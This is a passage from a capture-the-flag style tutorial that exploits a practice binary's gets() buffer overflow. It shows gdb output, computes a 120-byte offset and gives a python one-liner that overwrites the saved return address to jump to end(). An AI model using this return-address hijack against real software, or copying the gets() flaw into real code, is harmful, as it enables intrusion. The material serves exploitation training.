irst let's see if it is a 32 bit or 64 bit elf.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b3_64$ file b3_64
b3_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b03620f900a0d38c76f152f1d4f974784315b90f, not stripped
```

Now that we know it is a 64 bit elf, let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

void fun0()
{
        char buf0[100];
        printf("What is 1 divided by 0?\n");
        gets(buf0);
}


int main()
{
        printf("To reach the end of this room, you must answer one simple question with base 10 numbers.\n");
        fun0();
}

void end()
{
        printf("That is one way of reaching the end. Level Cleared\n");
}
```

So we can see here, our objective is to get the code to run the end() function. However it isn't called anywhere in the code, or given the oppurtunity to through the use of something like an if then statement. We see that
in the fun0() function, it has a buffer overflow vulnerabillity. We can use the buffer overflow vulnerabillity to overflow the rip register (since it is 62 bit) to change the return address to that of the end() function that way when fun0 is done executing it will execute the end() function.

We will need to calculate the difference between the start of our input and where the rip register is stored, and find the address of the end() function. For this we can use gdb.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b3_64$ gdb ./b3_64
```

One wall of text later...

```
gdb-peda$ disas fun0
Dump of assembler code for function fun0:
   0x0000000000400566 <+0>: push   rbp
   0x0000000000400567 <+1>: mov    rbp,rsp
   0x000000000040056a <+4>: sub    rsp,0x70
   0x000000000040056e <+8>: mov    edi,0x400648
   0x0000000000400573 <+13>:  call   0x400430 <puts@plt>
   0x0000000000400578 <+18>:  lea    rax,[rbp-0x70]
   0x000000000040057c <+22>:  mov    rdi,rax
   0x000000000040057f <+25>:  mov    eax,0x0
   0x0000000000400584 <+30>:  call   0x400450 <gets@plt>
   0x0000000000400589 <+35>:  nop
   0x000000000040058a <+36>:  leave  
   0x000000000040058b <+37>:  ret    
End of assembler dump.
gdb-peda$ b *fun0+35
Breakpoint 1 at 0x400589
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b3_64/b3_64 
To reach the end of this room, you must answer one simple question with base 10 numbers.
What is 1 divided by 0?
75395128
```

Another wall of text later...

```
Breakpoint 1, 0x0000000000400589 in fun0 ()
gdb-peda$ x $rbp-0x70
   0x7fffffffdde0:  (bad)  
gdb-peda$ find 75395128
Searching for '75395128' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x602420 ("75395128\n")
[stack] : 0x7fffffffdde0 ("75395128")
gdb-peda$ x/x $rbp-0x70
0x7fffffffdde0: 0x37
gdb-peda$ x/d $rbp-0x70
0x7fffffffdde0: 55
gdb-peda$ x/s $rbp-0x70
0x7fffffffdde0: "75395128"
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x400589 in fun0; saved rip = 0x4005a4
 called by frame at 0x7fffffffde70
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
  gdb-peda$ p end
$1 = {<text variable, no debug info>} 0x4005ab <end>
```

So we have the location of where the buffer starts, which is 0x7fffffffdde0. In addition to that we also have the location of the rip register (64 bit equivalent of the eip register) 0x7fffffffde58, and the location of the end() function 0x4005ab. Now we can calculate the offset between our input, and the rip register.

```
guyinatuxedo@tux:~$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffde58 - 0x7fffffffdde0
120
>>> quit()
```

So we need to input 120 bytes in order to reach the rip register. Then we can push the rip register onto the stack in little endian. Let's make an exploit to do that.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b3_64$ python -c 'print "0"*120 + "\xab\x05\x40"' | ./b3_64
To reach the end of this room, you must answer one simple question with base 10 numbers.
What is 1 divided by 0?
That is one way of reaching the end. Level Cleared
```

And just like that, we hijacked code execution and pwned the binary. 
